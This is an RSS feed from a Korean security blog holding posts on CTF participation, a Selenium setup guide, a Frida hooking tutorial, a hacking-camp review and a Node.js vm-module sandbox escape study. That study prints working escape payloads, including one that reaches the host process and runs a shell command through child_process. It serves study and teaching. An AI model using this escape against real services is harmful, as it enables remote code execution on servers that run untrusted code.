<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>JHYEON</title>
    <link>https://blog.jhyeon.dev/</link>
    
    <atom:link href="https://blog.jhyeon.dev/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>JHYEON BLOG</description>
    <pubDate>Sat, 10 Apr 2021 15:00:00 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>CTF(Capture the Flag)에 관한 개인적인 생각</title>
      <link>https://blog.jhyeon.dev/2021/04/11/ctfreview-210411/</link>
      <guid>https://blog.jhyeon.dev/2021/04/11/ctfreview-210411/</guid>
      <pubDate>Sat, 10 Apr 2021 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;요즘 주말마다 ctftime.org를 통해 OpenCTF에 종종 참여하고 있다.&lt;/p&gt;
&lt;p&gt;아무래도 요즘 공부가 더 필요하다는 생각이 들면서 최대한 많은 분야와 기술을 접해보기 위한 목적이라곤 할 수 있다.&lt;/p&gt;
&lt;p&gt;그러나.. 요즘 CTF에</description>
        
      
      
      
      <content:encoded><![CDATA[<p>요즘 주말마다 ctftime.org를 통해 OpenCTF에 종종 참여하고 있다.</p><p>아무래도 요즘 공부가 더 필요하다는 생각이 들면서 최대한 많은 분야와 기술을 접해보기 위한 목적이라곤 할 수 있다.</p><p>그러나.. 요즘 CTF에 참여해보면 취약점 위주의 문제라기 보다 <code> 억지 아이디어로 만들어낸 것 </code> 이나 <code> 짬뽕 </code> 시켜놓거나</p><p></code> 게싱(Guessing) </code> 문제들이 꽤 많이 나오는 것 같다. (그렇다, 즉 시간 낭비라는 뜻이다.)</p><p>뭐 이건 CTF마다 차이가 있을 수 있다. 대개 국내에서 유명한 CTF라고 하면 CODEGATE, CCE 등 유명한 대회들도 있을 것이다.</p><p>개인적으로 확실히 문제 퀄리티가 괜찮고 풀면서 도움이 된다고 생각하는 대회들은 위 예시를 든 대회들이 있다.</p><p>그에 비해 OpenCTF로 진행되는 CTF 일부 문제들은 확실히 전년도, 전전년도에 비해 퀄리티도 엄청 떨어지고 있다는 생각을 한다.</p><p>왜 그런건지는 모르겠지만, 참여하면서 불만적인 사항들도 많이 생겨서 그냥 짧은 개인적인 리뷰글을 써봤다.</p>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Memo/">Memo</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/CTF/">CTF</category>
      
      <category domain="https://blog.jhyeon.dev/tags/CTFtime/">CTFtime</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/04/11/ctfreview-210411/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>VirtualBox Escape Research(CVE 2019-2525 &amp; 2548)</title>
      <link>https://blog.jhyeon.dev/2021/04/11/virtualboxcve-210411/</link>
      <guid>https://blog.jhyeon.dev/2021/04/11/virtualboxcve-210411/</guid>
      <pubDate>Sat, 10 Apr 2021 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h3 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h3&gt;&lt;img src=&quot;/img/post/demon/virtualbox/team.png&quot; class=&quot;lazyloa</description>
        
      
      
      
      <content:encoded><![CDATA[<h3 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h3><img src="/img/post/demon/virtualbox/team.png" class="lazyload" data-srcset="/img/post/demon/virtualbox/team.png" srcset="data:image/png;base64,666"><p>이번에 소속으로 활동 중인 데몬팀(DEMON TEAM) 팀 세미나 진행을 위해 “VirtualBox Research Study Team” 에서</p><p>VirtualBox Escape (CVE 2019-2525 &amp; 2548) 에 대해 연구했던 자료를 공유합니다.</p><p>발표 자료는 비공개지만, 개인 노션에 정리한 자료는 다음 링크에서 확인할 수 있습니다.</p><p><a href="https://public.jhyeon.dev/research/virtualbox">https://public.jhyeon.dev/research/virtualbox</a></p>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Research/">Research</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/Pwnable/">Pwnable</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Reversing/">Reversing</category>
      
      <category domain="https://blog.jhyeon.dev/tags/VirtualBox/">VirtualBox</category>
      
      <category domain="https://blog.jhyeon.dev/tags/CVE/">CVE</category>
      
      <category domain="https://blog.jhyeon.dev/tags/CVSS/">CVSS</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/04/11/virtualboxcve-210411/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>AngStormCTF 2021 Write-Up</title>
      <link>https://blog.jhyeon.dev/2021/04/10/angstormctf-210410/</link>
      <guid>https://blog.jhyeon.dev/2021/04/10/angstormctf-210410/</guid>
      <pubDate>Fri, 09 Apr 2021 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h3 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h3&gt;&lt;p&gt;이번 CTF는 평소 친한 형들과 같이 참여를 하게 되었습니다.&lt;/p&gt;
&lt;p&gt;TEAM_NAME : &lt;cod</description>
        
      
      
      
      <content:encoded><![CDATA[<h3 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h3><p>이번 CTF는 평소 친한 형들과 같이 참여를 하게 되었습니다.</p><p>TEAM_NAME : <code> pwnhub (rank 195th, 1200pt) </code></p><p>풀이 게시글은 아래 노션에서 확인하실 수 있습니다.</p><p><a href="https://public.jhyeon.dev/ctf/angstorm2021">https://public.jhyeon.dev/ctf/angstorm2021</a></p>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/CTF/">CTF</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/Web/">Web</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Pwnable/">Pwnable</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Reversing/">Reversing</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Crpyto/">Crpyto</category>
      
      <category domain="https://blog.jhyeon.dev/tags/CTF/">CTF</category>
      
      <category domain="https://blog.jhyeon.dev/tags/AngStormCTF-2021/">AngStormCTF 2021</category>
      
      <category domain="https://blog.jhyeon.dev/tags/CTFtime/">CTFtime</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/04/10/angstormctf-210410/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>UMassCTF&#39;21 Write Up</title>
      <link>https://blog.jhyeon.dev/2021/03/29/umassctf-210329/</link>
      <guid>https://blog.jhyeon.dev/2021/03/29/umassctf-210329/</guid>
      <pubDate>Sun, 28 Mar 2021 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h3 id=&quot;Post&quot;&gt;&lt;a href=&quot;#Post&quot; class=&quot;headerlink&quot; title=&quot;Post&quot;&gt;&lt;/a&gt;Post&lt;/h3&gt;&lt;p&gt;해당 게시글은 아래의 노션을 통해서 확인이 가능합니다.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://public.</description>
        
      
      
      
      <content:encoded><![CDATA[<h3 id="Post"><a href="#Post" class="headerlink" title="Post"></a>Post</h3><p>해당 게시글은 아래의 노션을 통해서 확인이 가능합니다.</p><p><a href="https://public.jhyeon.dev/540fa8cc-458c-451c-a0d0-d614f5a57fb5">https://public.jhyeon.dev/540fa8cc-458c-451c-a0d0-d614f5a57fb5</a></p>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/CTF/">CTF</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/Web/">Web</category>
      
      <category domain="https://blog.jhyeon.dev/tags/CTF/">CTF</category>
      
      <category domain="https://blog.jhyeon.dev/tags/CTFtime/">CTFtime</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Web-Hacking/">Web Hacking</category>
      
      <category domain="https://blog.jhyeon.dev/tags/UMassCTF-21/">UMassCTF&#39;21</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/03/29/umassctf-210329/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>AWS EC2 환경에서 Selenium(ChromeDriver) 활용하기</title>
      <link>https://blog.jhyeon.dev/2021/03/25/awschrome-210325/</link>
      <guid>https://blog.jhyeon.dev/2021/03/25/awschrome-210325/</guid>
      <pubDate>Wed, 24 Mar 2021 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h2&gt;&lt;p&gt;최근에 AWS EC2, Ubuntu CLI 환경에서 Selenium을 활용할 일이 있었는데 그 과정을 정</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><p>최근에 AWS EC2, Ubuntu CLI 환경에서 Selenium을 활용할 일이 있었는데 그 과정을 정리해놓고 나중에 써먹고자</p><p>아래의 글을 정리한다.</p><h3 id="Install-Package"><a href="#Install-Package" class="headerlink" title="Install Package"></a>Install Package</h3><p>우선 chromedriver를 사용하기 전 크롬과 관련된 패키지를 설치 해줘야 한다.</p><pre><code class="bash">sudo apt updatesudo apt install wget unzipecho &quot;deb [arch=amd64] http://dl.google.com/linux/chrome/deb/ stable main&quot; &gt;&gt; /etc/apt/sources.listwget https://dl.google.com/linux/linux_signing_key.pubsudo apt install gnupgsudo apt-key add linux_signing_key.pubsudo apt install google-chrome-stable</code></pre><p>여기까지가 관련 패키지들을 설치해주는 명령어이다. 그 다음은 selenium 설치 과정이다.</p><p>pip로 selenium을 설치해주면 끝나서 간편하다.</p><pre><code class="bash">pip3 install --user selenium</code></pre><p>이렇게만 설치한다고 끝이 아닌, 크롬 공식 홈페이지에서 driver를 다운 받아줘야 한다.</p><p><a href="http://chromedriver.chromium.org/downloads">http://chromedriver.chromium.org/downloads</a></p><p>위 사이트에서 크롬 브라우저의 버전을 선택하여 wget으로 내려 받은 뒤 실행 파일을 사용하면 된다.</p><pre><code class="bash">wget https://chromedriver.storage.googleapis.com/89.0.4389.23/chromedriver_linux64.zipunzip chromedriver_linux64.zip</code></pre><h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><p>이렇게 설치했으면 크롬 브라우저를 어떻게 활용하냐, python 기준으로 예제 코드는 다음과 같다.</p><p>사실, 크롬 브라우저가 메모리를 되게 먹기 때문에 multiprocessing 처리를 하는 방식 등으로 사용하면 좋을 듯 하다.</p><p>메모리를 좀 줄여보겠다고 gpu, headless 등 각종 옵션을 넣긴 했지만 자체적으로 메모리를 많이 써서 큰 도움은 안되는 듯 하다.</p><pre><code class="py">#!/usr/bin/python3from selenium import webdriverfrom selenium.webdriver.chrome.options import Optionsdef openbr():    url = &quot;&quot;    options = webdriver.ChromeOptions()    options.add_argument(&#39;--headless&#39;)    options.add_argument(&#39;--no-sandbox&#39;)    options.add_argument(&#39;--disable-dev-shm-usage&#39;)    options.add_argument(&quot;--disable-gpu&quot;)    options.add_argument(&quot;--disable-infobars&quot;)    browser = webdriver.Chrome(chrome_options=options, executable_path=&quot;./chromedriver&quot;)    browser.get(url)    html = browser.page_source    return htmlif __name__ == &quot;__main__&quot;:    try:        openbr()    except Exception as excepterr:        logging~~</code></pre>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Docx/">Docx</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/AWS/">AWS</category>
      
      <category domain="https://blog.jhyeon.dev/tags/EC2/">EC2</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Ubuntu-CLI/">Ubuntu CLI</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Selenium/">Selenium</category>
      
      <category domain="https://blog.jhyeon.dev/tags/ChromeDriver/">ChromeDriver</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/03/25/awschrome-210325/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Node.JS VM Module Sandbox Escape Research</title>
      <link>https://blog.jhyeon.dev/2021/03/08/nodejs-vmescape/</link>
      <guid>https://blog.jhyeon.dev/2021/03/08/nodejs-vmescape/</guid>
      <pubDate>Sun, 07 Mar 2021 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h3 id=&quot;1-Node-JS&quot;&gt;&lt;a href=&quot;#1-Node-JS&quot; class=&quot;headerlink&quot; title=&quot;[1] Node.JS&quot;&gt;&lt;/a&gt;[1] Node.JS&lt;/h3&gt;&lt;p&gt;Node.JS는 네트워크 애플리케이션(서버 사이드) 개발에 사용되는 </description>
        
      
      
      
      <content:encoded><![CDATA[<h3 id="1-Node-JS"><a href="#1-Node-JS" class="headerlink" title="[1] Node.JS"></a>[1] Node.JS</h3><p>Node.JS는 네트워크 애플리케이션(서버 사이드) 개발에 사용되는 소프트웨어 플랫폼입니다.</p><p>Javascript 언어를 사용하며, Non-blocking I/O와 단일 스레드 이벤트 루프를 사용하여 높은 처리 성능을 가지고 있습니다.</p><p>또한, HTTP 라이브러리를 내장하고 있어 웹 서버 구동에 필요한 Apache, Nginx와 같이 별도의 소프트웨어를 필요로 하지 않습니다.</p><hr><h3 id="2-Sandbox"><a href="#2-Sandbox" class="headerlink" title="[2] Sandbox"></a>[2] Sandbox</h3><p>Sandbox란, 외부에서 코드를 실행하거나 신뢰할 수 없는 코드를 안전하게 실행할 수 있도록 메인 시스템과 격리된 환경에서 실행되는 환경입니다.</p><p>Node.JS 기준으로는 <code>vm</code> 모듈이 존재하는데, 해당 모듈에 대해서는 아래 목차에서 좀 더 세심하게 다뤄보겠습니다.</p><h3 id="3-Node-JS-VM-Module"><a href="#3-Node-JS-VM-Module" class="headerlink" title="[3] Node.JS VM Module"></a>[3] Node.JS VM Module</h3><p>우선, Node JS에서는 임의의 JS 코드를 안전한 환경에서 실행될 수 있도록 하기 위해 <code>VM</code> 모듈을 제공하고</p><p>있습니다. 해당 모듈은 V8 가상 머신 컨택스트 내에서 코드를 컴파일하고 실행합니다.</p><p>물론, 해당 모듈이 안전하다고 볼수도 없습니다. 신뢰할 수 없는 코드나 임의의 코드를 실행할 수 있게 하지만 이러한 코드에서</p><p>Sandbox 환경을 escape하는 경우가 발생할 때는 시스템에 치명적인 영향을 미칠 수 있기 때문입니다.</p><p>아래는 VM 모듈에 대한 공식 문서 Sample Code 자료입니다.</p><pre><code class="js">const vm = require(&#39;vm&#39;);const x = 1;const context = &#123; x: 2 &#125;;vm.createContext(context); // Contextify the object.const code = &#39;x += 40; var y = 17;&#39;;// `x` and `y` are global variables in the context.// Initially, x has the value 2 because that is the value of context.x.vm.runInContext(code, context);console.log(context.x); // 42console.log(context.y); // 17console.log(x); // 1; y is not defined.</code></pre><h3 id="4-Run-VM-Module-Script"><a href="#4-Run-VM-Module-Script" class="headerlink" title="[4] Run VM Module Script"></a>[4] Run VM Module Script</h3><p>위 예제처럼, VM 모듈을 사용하여 스크립트를 실행하는 방법은 공식 문서에 함수 표현식 옵션이 몇 가지 존재합니다.</p><ul><li>script.runInContext(contextifiedObject[, options])</li></ul><pre><code class="js">const vm = require(&#39;vm&#39;)const context = &#123;  id: &#39;name&#39;,  price: 10000&#125;;const script = new vm.Script(&#39;price += 10000&#39;);vm.createContext(context);script.runInContext(context);console.log(context);/** result : 20000 **/</code></pre><ul><li>script.runInNewContext([contextObject[, options]])</li></ul><pre><code class="js">const vm = require(&#39;vm&#39;)const script = new vm.Script(&#39;variable = &quot;test&quot;&#39;);const context = [&#123;&#125;, &#123;&#125;];context.forEach((context) =&gt; &#123;    script.runInNewContext(context);&#125;);console.log(context);/** result [ &#123; variable: &#39;test&#39; &#125;, &#123; variable: &#39;test&#39; &#125; ] **/</code></pre><ul><li>script.runInThisContext([options])</li></ul><pre><code class="js">const vm = require(&#39;vm&#39;)global.variable = 0;const script = new vm.Script(&#39;variable += 1&#39;);for(let i=0; i&lt;1000; i++)&#123;    script.runInThisContext();&#125;console.log(variable);/** result : 1000 **/</code></pre><ul><li>vm.createContext([contextObject[, options]])</li></ul><pre><code class="js">const vm = require(&#39;vm&#39;);global.globalVar = 3;const context = &#123; globalVar: 1 &#125;;vm.createContext(context);vm.runInContext(&#39;globalVar *= 2;&#39;, context);console.log(context);// Prints: &#123; globalVar: 2 &#125;console.log(global.globalVar);// Prints: 3</code></pre><ul><li>vm.runInContext(code, contextifiedObject[, options])</li></ul><pre><code class="js">const vm = require(&#39;vm&#39;);const obj = &#123; globalvar: 1 &#125;;vm.createContext(obj);for(let i=0; i&lt;500; i++)&#123;    vm.runInContext(&#39;globalvar += 1&#39;, obj);&#125;console.log(obj);/** result : 501 **/</code></pre><ul><li>vm.runInNewContext(code[, contextObject[, options]])</li></ul><pre><code class="js">const vm = require(&#39;vm&#39;);const contextObject = &#123;  animal: &#39;cat&#39;,  count: 2&#125;;vm.runInNewContext(&#39;count += 1; name = &quot;kitty&quot;&#39;, contextObject);console.log(contextObject);// Prints: &#123; animal: &#39;cat&#39;, count: 3, name: &#39;kitty&#39; &#125;</code></pre><ul><li>vm.runInThisContext(code[, options])</li></ul><pre><code class="js">const vm = require(&#39;vm&#39;);let localVar = &#39;initial value&#39;;const vmResult = vm.runInThisContext(&#39;localVar = &quot;vm&quot;;&#39;);console.log(`vmResult: &#39;$&#123;vmResult&#125;&#39;, localVar: &#39;$&#123;localVar&#125;&#39;`);// Prints: vmResult: &#39;vm&#39;, localVar: &#39;initial value&#39;const evalResult = eval(&#39;localVar = &quot;eval&quot;;&#39;);console.log(`evalResult: &#39;$&#123;evalResult&#125;&#39;, localVar: &#39;$&#123;localVar&#125;&#39;`);// Prints: evalResult: &#39;eval&#39;, localVar: &#39;eval&#39;</code></pre><h3 id="5-Escaping-for-VM-Module"><a href="#5-Escaping-for-VM-Module" class="headerlink" title="[5] Escaping for VM Module"></a>[5] Escaping for VM Module</h3><p>최근에 CTF를 자주 참여하는 편인데 이번 zer0ctf 2021 CTF에서 해당 문제가 나왔었는데, 풀이 관련은 추후 정리가 완료되는대로 별도의 포스팅을 해볼 예정입니다.</p><p>우선 [2]에서도 설명 했듯이 VM 모듈을 사용할 때 신뢰할 수 없는 코드, 임의의 코드를 실행할 수 있게 되는 경우 이러한 환경을 탈출할 수 있고,</p><p>VM Context 외부의 객체를 통해 시스템에 치명적인 영향을 끼칠 수 있습니다.</p><p>아래는 일반적인 vm script 코드이며, bypass가 가능한 상황과 비교해보겠습니다.</p><pre><code class="js">const vm = require(&#39;vm&#39;);const msg = vm.runInNewContext(`&quot;use strict&quot;; let a = &quot;hello world&quot;; a;`, Object.create(null), &#123;timeout: 500&#125;);console.log(msg);</code></pre><p><code>escape1.js</code></p><pre><code class="js">const vm = require(&#39;vm&#39;);const cmd = vm.runInNewContext(`&quot;use strict&quot;; this.constructor.constructor(&#39;return this.process&#39;)()`, Object.create(null), &#123;timeout: 500&#125;);console.log(cmd);</code></pre><p><code>escape_rce.js</code></p><pre><code class="js">const vm = require(&#39;vm&#39;);const cmd = vm.runInNewContext(`&quot;use strict&quot;; const process = this.constructor.constructor(&#39;return this.process&#39;)(); process.mainModule.require(&#39;child_process&#39;).execSync(&#39;cat ./hellopoc&#39;).toString()`);console.log(cmd);</code></pre><img src="/img/post/nodejs_escape/1.png" class="lazyload" data-srcset="/img/post/nodejs_escape/1.png" srcset="data:image/png;base64,666"><p>위와 같이 sandbox 환경을 escape하여 RCE를 진행할 수 있게 됩니다.</p><p>물론 해당 방법 이외에도 다양한 bypass technology 들이 존재하나, 추후 여건이 되면 심화적인 접근을 다뤄보겠습니다.</p><p>참고하고 공부할 만한 링크는 아래 정리해두겠습니다.</p><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul><li><p><a href="https://nodejs.org/api/vm.html">https://nodejs.org/api/vm.html</a></p></li><li><p><a href="https://millermedeiros.github.io/mdoc/examples/node_api/doc/vm.html">https://millermedeiros.github.io/mdoc/examples/node_api/doc/vm.html</a></p></li><li><p><a href="https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html">https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html</a></p></li><li><p><a href="https://blog.netspi.com/escape-nodejs-sandboxes/">https://blog.netspi.com/escape-nodejs-sandboxes/</a></p></li></ul>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Research/">Research</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/NodeJS/">NodeJS</category>
      
      <category domain="https://blog.jhyeon.dev/tags/V8-Engine/">V8 Engine</category>
      
      <category domain="https://blog.jhyeon.dev/tags/VM-Module/">VM Module</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Sandbox/">Sandbox</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Code-Execution/">Code Execution</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/03/08/nodejs-vmescape/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>AeroCTF 2021 Write up</title>
      <link>https://blog.jhyeon.dev/2021/02/28/aeroctf2021-210228/</link>
      <guid>https://blog.jhyeon.dev/2021/02/28/aeroctf2021-210228/</guid>
      <pubDate>Sat, 27 Feb 2021 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;이번에 팀원분들과 함께 CTF를 진행하였습니다. 제가 푼 문제는 아래 노션에 풀이가 작성되어 있습니다!&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://public.jhyeon.dev/e08f5543-0769-4404-a7fa-2e7b5a28b66e&quot;</description>
        
      
      
      
      <content:encoded><![CDATA[<p>이번에 팀원분들과 함께 CTF를 진행하였습니다. 제가 푼 문제는 아래 노션에 풀이가 작성되어 있습니다!</p><p><a href="https://public.jhyeon.dev/e08f5543-0769-4404-a7fa-2e7b5a28b66e">https://public.jhyeon.dev/e08f5543-0769-4404-a7fa-2e7b5a28b66e</a></p>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/CTF/">CTF</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/Web/">Web</category>
      
      <category domain="https://blog.jhyeon.dev/tags/CTF/">CTF</category>
      
      <category domain="https://blog.jhyeon.dev/tags/AeroCTF2021/">AeroCTF2021</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/02/28/aeroctf2021-210228/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Frida를 통한 앱 내부 라이브러리 후킹 방법</title>
      <link>https://blog.jhyeon.dev/2021/02/22/frida-hook1-210222/</link>
      <guid>https://blog.jhyeon.dev/2021/02/22/frida-hook1-210222/</guid>
      <pubDate>Sun, 21 Feb 2021 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;이번에, 앱을 분석해보다가 특정 라이브러리에 대해 후킹을 해야 하는 상황이 있었는데, 그 방법론을 기억에 남기고자&lt;/p&gt;
&lt;p&gt;아래 작성합니다.&lt;/p&gt;
&lt;p&gt;우선, 뭐든지 공식 문서에는 답이 매우 잘 나와있습니다.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;h</description>
        
      
      
      
      <content:encoded><![CDATA[<p>이번에, 앱을 분석해보다가 특정 라이브러리에 대해 후킹을 해야 하는 상황이 있었는데, 그 방법론을 기억에 남기고자</p><p>아래 작성합니다.</p><p>우선, 뭐든지 공식 문서에는 답이 매우 잘 나와있습니다.</p><p><a href="https://frida.re/docs/javascript-api/#interceptor">https://frida.re/docs/javascript-api/#interceptor</a></p><p>해당 라인을 보시면, <code> Interceptor.attach </code> 를 통해서 특정 함수의 호출을 catch할 수 있고,</p><p>함수의 주소를 가져오거나, 후킹을 진행할 수 있게됩니다.</p><p>아래는 예제 코드입니다.</p><pre><code class="java">Interceptor.attach(Module.findExportByName(&quot;라이브러리 파일&quot;, &quot;함수명&quot;), &#123;    onEnter: function(args)&#123;        this.input = Memory.readUtf8String(args[0]);            //input    &#125;,    onLeave: function(retval)&#123;        return 0;    &#125;&#125;</code></pre><p>물론 dlopen 함수 후킹을 통해 라이브러리가 로드되는 시점을 후킹할 수도 있습니다.</p><pre><code class="java">Interceptor.attach(Module.findExportByName(null, &quot;dlopen&quot;), &#123;    onEnter: function(args)&#123;        this.input = Memory.readUtf8String(args[0]);        if(this.input.indexOf(&quot;lib64.so&quot;) !== -1)&#123;            console.log(&quot;lib64.so Loaded!&quot;);            Thread.sleep(5);        &#125;    &#125;,    onLeave: function(retval)&#123;        return 0;    &#125;&#125;</code></pre><p>이러한 방법도 있고 앞으로 앱 관련 분석을 해보면서, 조금 더 심화적인 것들을 많이 연구해보고 또 글을 쓰도록 하겠습니다.</p>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Mobile/">Mobile</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/Android/">Android</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Application/">Application</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Penetration/">Penetration</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Frida/">Frida</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Hooking/">Hooking</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/02/22/frida-hook1-210222/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>(추가) 해킹캠프(HACKINGCAMP) 22기 운영 후기</title>
      <link>https://blog.jhyeon.dev/2021/02/21/hcamp22th/</link>
      <guid>https://blog.jhyeon.dev/2021/02/21/hcamp22th/</guid>
      <pubDate>Sat, 20 Feb 2021 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;먼저, 해킹캠프에 대해서 궁금하신 분들이 있을 수 있기 때문에 아래 간략하게 설명을 남긴다.&lt;/p&gt;
&lt;h3 id=&quot;해킹캠프란&quot;&gt;&lt;a href=&quot;#해킹캠프란&quot; class=&quot;headerlink&quot; title=&quot;해킹캠프란?&quot;&gt;&lt;/a&gt;해킹캠프란?&lt;/h3&gt;</description>
        
      
      
      
      <content:encoded><![CDATA[<p>먼저, 해킹캠프에 대해서 궁금하신 분들이 있을 수 있기 때문에 아래 간략하게 설명을 남긴다.</p><h3 id="해킹캠프란"><a href="#해킹캠프란" class="headerlink" title="해킹캠프란?"></a>해킹캠프란?</h3><p>해킹캠프는 해킹과 보안에 관심을 가지고 있는 국내 학생들을 위해 국제 해킹·보안 컨퍼런스 POC(POC SECURITY 주관)가 운영하는 해킹·보안 캠프입니다.</p><p><a href="https://hackingcamp.org/">https://hackingcamp.org</a></p><h3 id="Agenda"><a href="#Agenda" class="headerlink" title="Agenda"></a>Agenda</h3><ul><li><p>발표 세션</p><ul><li>악성코드로 알아보는 사이버 크라임 갱(부제: 코인 떡상과 발표자의 피땀눈물) / 안소희 발표자님</li><li>버그바운티 어서오고(부제: CTF Vs Bug Bounty) / 유동현 발표자님</li><li>퍼징의 이해 및 실습 / 장대희 발표자님</li><li>Fun, Cool, Sexy 하게 해킹하기 (네트워크, 웹 프로토콜 분석 방법) / 장한빈 발표자님</li><li>웹 취약점 스캐너 / 김주원 발표자님</li><li>CodeQL Analysis / 홍승표 발표자님</li></ul></li><li><p>이벤트 세션</p><ul><li>숙명여대 정보보호동아리 SISS 퀴즈 이벤트</li><li>해킹캠프CTF</li><li>Demon Q&amp;A (데몬팀 멤버들에게 궁금한 것들 질답하는 시간)</li></ul></li></ul><p>전체적인 Agenda는 위와 같이 구성이 되었습니다. 저 역시도 발표자분들이 진행해주시는 발표 내용을 들으면서,</p><p>유익한 지식도 많이 알게 되었습니다. 중간중간 퀴즈를 진행해주시는 SISS 분들도 고생을 많이 하셨고 재밌었던 것 같습니다.</p><p>다음은 데몬팀에서 준비한 해킹캠프 CTF에 잠깐 리뷰를 해드리겠습니다.</p><p>저를 포함한 데몬팀에서 활동하시는 분들께서 <code> 웹, 포너블, 리버싱, 미스크 </code> 분야로 총 20개의 문제를 준비하셨고,</p><p>대회 중에는 큰 문제없이 잘 끝냈던 것 같습니다. (아마도..)</p><p>사실, 중간중간 제가 출제한 문제에 대해서 버그랑 오류가 확인되었는데 자리를 잠깐 비운사이에 문제가 생겼더군요 ㅠ_ㅠ</p><p>하지만 빠르게 인지하고 수정한 덕분에 참가자분들이 혼란없이 문제를 풀이하실 수 있었던 것 같습니다.</p><p>(앞으로, 조금 더 신경쓰면서 문제를 만들고 관리해야 겠습니다!!)</p><p>마지막으로, 20:00 ~ 02:00 (6시간) 동안 진행된 대회의 결과는 아래 사진을 첨부합니다.</p><img src="/img/post/hcamp22/hcamp.png" class="lazyload" data-srcset="/img/post/hcamp22/hcamp.png" srcset="data:image/png;base64,666"><p>코로나19 여파로 인해 온라인 진행이였음에도 불구하고 많은 관심을 가지고 참여해주신 참가자분들에게 감사의 인사를 전달드리고 싶고,</p><p>POC 관계자분들, SISS, DEMON 팀원 모두 고생하셨습니다.</p><p>올해 하반기에 있을 해킹캠프에도 많은 관심을 가져주셨으면 좋겠습니다!</p><h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><p>2/22 00:00 ~ 3/1 23:59분까지 해킹캠프 CTF에 관심이 있으신 분들이 많을 것으로 예상되어,</p><p>해당 기간동안 CTF 사이트를 공개합니다! 많은 관심 가져주시고 올해 하반기에 있을 제 23회 해킹캠프에도 많이 참여해주세요~~</p><p><a href="https://ctf.hackingcamp.org/">https://ctf.hackingcamp.org</a></p><p>이상. 글을 마치겠습니다.</p>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Memo/">Memo</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/HCAMP/">HCAMP</category>
      
